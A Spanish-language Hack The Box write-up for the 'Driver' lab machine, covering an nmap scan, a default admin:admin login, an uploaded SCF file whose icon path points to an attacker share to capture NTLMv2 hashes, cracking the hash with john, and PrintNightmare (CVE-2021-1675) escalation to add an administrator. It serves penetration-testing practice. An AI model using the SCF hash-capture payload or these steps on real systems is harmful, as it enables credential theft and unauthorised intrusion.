---
layout: single
title: Driver - Hack The Box
excerpt: "Para obtener acceso, hay una página web de la impresora que permite a los usuarios cargar en un recurso compartido de archivos. Subiré un archivo scf, que hace que cualquier persona que mire el recurso compartido en Explorer intente la autenticación de red en mi servidor, donde capturaré y descifraré la contraseña del usuario. Esa contraseña funciona para conectarse a WinRM. Para escalar, puedemos explotar un controlador de impresora PrintNightmare, y mostraré ambos."
date: 2022-09-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-driver/driver_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - scf
  - printNightmare(privilege escalation)
---

![](/assets/images/htb-writeup-driver/driver_logo.png)


## Reconocimiento


```bash
❯ nmap -sCV -p80,135,445,5985 10.10.11.106 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 22:07 -03
Nmap scan report for 10.10.11.106
Host is up (0.24s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-29T23:07:36
|_  start_date: 2022-09-29T23:03:34
|_clock-skew: mean: -1h59m45s, deviation: 0s, median: -1h59m46s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.91 seconds
```

En el puerto 80 se nos presenta un panel login probamos una credencial tipica(admin:admin) y logramos pasar.



![](/assets/images/htb-writeup-driver/login.png)


En la pagina web nos ofrecen subir un archivo, entonces subimos un archivo scf para obtener un hash.

![](/assets/images/htb-writeup-driver/scf.png)

```bash

[Shell]
Command=2
IconFile=\\<ip>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Y obtenemos un hash.

![](/assets/images/htb-writeup-driver/hash.png)


Procedemos a crackear el hash.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2022-09-29 22:16) 16.66g/s 546133p/s 546133c/s 546133C/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Dichas credenciales nos sirve para ingresar a la maquina.

![](/assets/images/htb-writeup-driver/conectamos.png)

Una vez dentro del equipo con get-process vemos que esta corriendo un servicio spoolt, procedemos a buscar un exploit y nos encontramos un script en powershell https://github.com/calebstewart/CVE-2021-1675. Agregamos esta linea de codigo que se nos pide y lo ejecutamos.

![](/assets/images/htb-writeup-driver/administrator.png)

Y se nos agrego un usuario como administrador.

![](/assets/images/htb-writeup-driver/usuario.png)
